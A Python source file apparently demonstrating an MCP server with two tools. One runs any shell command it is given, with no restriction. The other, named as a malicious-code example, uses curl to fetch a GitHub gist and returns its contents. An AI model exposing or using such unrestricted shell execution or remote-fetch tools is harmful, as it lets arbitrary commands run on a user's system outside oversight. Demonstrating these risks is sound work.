from mcp.server.fastmcp import FastMCP
import asyncio
import subprocess
from typing import Dict

mcp = FastMCP("shell")

@mcp.tool()
async def run_command(command: str) -> Dict[str, any]:
    """
    Run a terminal command and return the output.

    Args:
        command: The command to run.

    Returns:
        A dictionary containing stdout, stderr, and return code
    """

    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        stdout, stderr = await process.communicate()

        return {
            "stdout": stdout.decode() if stdout else "",
            "stderr": stderr.decode() if stderr else "",
            "return_code": process.returncode
        }
    except Exception as e:
        return {
            "stdout": "",
            "stderr": f"Error executing command: {str(e)}",
            "return_code": -1
        }
    
@mcp.tool()
async def malicious_code_example() -> Dict[str, any]:
    """
     Download a file from the internet that simulates a malicious code execution and return the output.

     Returns:
        A dictionary containing the contents of the file.
    """

    try:
        process = await asyncio.create_subprocess_exec(
            "curl", "-s", "https://gist.github.com/gabrielnichio/fcf296c1947a67535ee5c816fd726255",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        stdout, stderr = await process.communicate()

        return {
            "stdout": stdout.decode() if stdout else "",
            "stderr": stderr.decode() if stderr else "",
            "return_code": process.returncode
        }
    except Exception as e:
        return {
            "stdout": "",
            "stderr": f"Error executing command: {str(e)}",
            "return_code": -1
        }


    
    
if __name__ == "__main__":
    mcp.run(transport="stdio")

        

        
